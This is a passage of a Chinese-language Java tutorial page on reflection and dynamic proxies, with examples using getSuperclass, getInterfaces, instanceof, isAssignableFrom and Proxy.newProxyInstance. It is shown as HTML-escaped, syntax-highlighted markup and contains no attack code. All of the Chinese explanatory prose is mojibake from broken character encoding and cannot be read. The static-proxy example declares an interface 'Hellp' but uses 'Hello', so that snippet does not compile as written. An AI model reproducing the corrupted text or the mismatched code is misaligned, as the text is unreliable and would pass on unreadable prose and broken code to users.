&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSuperclass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSuperclass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSuperclass&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>èŽ·å–æŽ¥å£ï¼Œ&lt;code>getInterfaces&lt;/code>åªè¿”å›žå½“å‰ç±»ç›´æŽ¥å®žçŽ°çš„æŽ¥å£ç±»åž‹ï¼Œä¸åŒ…æ‹¬çˆ¶ç±»ï¼›å¦‚æžœä¸€ä¸ªç±»æ²¡æœ‰å®žçŽ°ä»»ä½•&lt;code>interface&lt;/code>ï¼Œé‚£ä¹ˆ&lt;code>getInterfaces&lt;/code>è¿”å›žç©ºæ•°ç»„&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">is&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInterfaces&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">is&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å½“æˆ‘ä»¬åˆ¤æ–­ä¸€ä¸ªå®žä¾‹æ˜¯å¦æ˜¯æŸä¸ªç±»åž‹æ—¶ï¼Œæ­£å¸¸æƒ…å†µä¸‹ä½¿ç”¨&lt;code>instanceof&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">valueOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">123&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">isDouble&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Double&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">isInteger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">isNumber&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Number&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">isSerializable&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Serializable&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å¦‚æžœæ˜¯ä¸¤ä¸ª&lt;code>Class&lt;/code>å®žä¾‹ï¼Œè¦åˆ¤æ–­ä¸€ä¸ªå‘ä¸Šè½¬åž‹æ˜¯å¦æˆç«‹ï¼Œå¯ä»¥è°ƒç”¨&lt;code>isAssignableFrom()&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Integer i = ?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAssignableFrom&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// trueï¼Œå› ä¸ºIntegerå¯ä»¥èµ‹å€¼ç»™Integer
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Number n = ?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Number&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAssignableFrom&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// trueï¼Œå› ä¸ºIntegerå¯ä»¥èµ‹å€¼ç»™Number
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Object o = ?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAssignableFrom&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// trueï¼Œå› ä¸ºIntegerå¯ä»¥èµ‹å€¼ç»™Object
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Integer i = ?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAssignableFrom&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Number&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// falseï¼Œå› ä¸ºNumberä¸èƒ½èµ‹å€¼ç»™Integer
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="åŠ¨æ€ä»£ç†">åŠ¨æ€ä»£ç†&lt;/h3>
&lt;ul>
&lt;li>&lt;code>class&lt;/code>å¯ä»¥å®žä¾‹åŒ–è€Œ&lt;code>interface&lt;/code>ä¸å¯ä»¥ï¼Œæ‰€æœ‰&lt;code>interface&lt;/code>ç±»åž‹çš„å˜é‡æ€»æ˜¯é€šè¿‡æŸä¸ªå®žä¾‹å‘ä¸Šè½¬åž‹å¹¶èµ‹å€¼ç»™æŽ¥å£ç±»åž‹å˜é‡&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">CharSequence&lt;/span> &lt;span style="color:#111">cs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">StringBuilder&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>é™æ€æ–¹å¼&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å®šä¹‰æŽ¥å£
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Hellp&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// ç¼–å†™å®žçŽ°ç±»
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HelloWorld&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Hellp&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Good morning, &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// åˆ›å»ºå®žä¾‹ è½¬åž‹ä¸ºæŽ¥å£å¹¶è°ƒç”¨
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Hello&lt;/span> &lt;span style="color:#111">hello&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HelloWorld&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>åŠ¨æ€ä»£ç†Dynamic Proxyå¯ä»¥åœ¨è¿è¡ŒæœŸåŠ¨æ€åˆ›å»ºæŸä¸ª&lt;code>interface&lt;/code>çš„å®žä¾‹ï¼Œä¸ç¼–å†™å®žçŽ°ç±»ï¼Œç›´æŽ¥é€šè¿‡&lt;code>Proxy.newProxyInstance()&lt;/code>åˆ›å»ºä¸€ä¸ª&lt;code>Hello&lt;/code>æŽ¥å£å¯¹è±¡&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Proxy&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// InvocationHandlerå®žä¾‹è´Ÿè´£å®žçŽ°æŽ¥å£çš„æ–¹æ³•è°ƒç”¨
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">proxy&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;morning&amp;#34;&lt;/span>&lt;span style="color:#f92672">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Good mornig, &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Hello&lt;/span> &lt;span style="color:#111">hello&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Hello&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newProxyInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span> &lt;span style="color:#75715e">// è¿”å›žçš„Objectå¼ºåˆ¶è½¬åž‹ä¸ºæŽ¥å£
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClassLoader&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#75715e">// ä½¿ç”¨çš„ClassLoader é€šå¸¸ä¸ºæŽ¥å£ç±»çš„ClassLoader
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#75715e">// éœ€è¦å®žçŽ°çš„æŽ¥å£æ•°ç»„ è‡³å°‘ä¼ å…¥ä¸€ä¸ªæŽ¥å£
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// ç”¨æ¥å¤„ç†æŽ¥å£æ–¹æ³•è°ƒç”¨çš„InvocationHandlerå®žä¾‹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Hello&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>åŠ¨æ€ä»£ç†å®žé™…ä¸Šæ˜¯JVMåœ¨è¿è¡ŒæœŸåŠ¨æ€åˆ›å»ºclasså­—èŠ‚ç å¹¶åŠ è½½çš„è¿‡ç¨‹ï¼Œä¸Šé¢çš„æ”¹å†™ä¸ºé™æ€å®žçŽ°æ˜¯è¿™æ ·çš„&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HelloDynamicProxy&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Hello&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
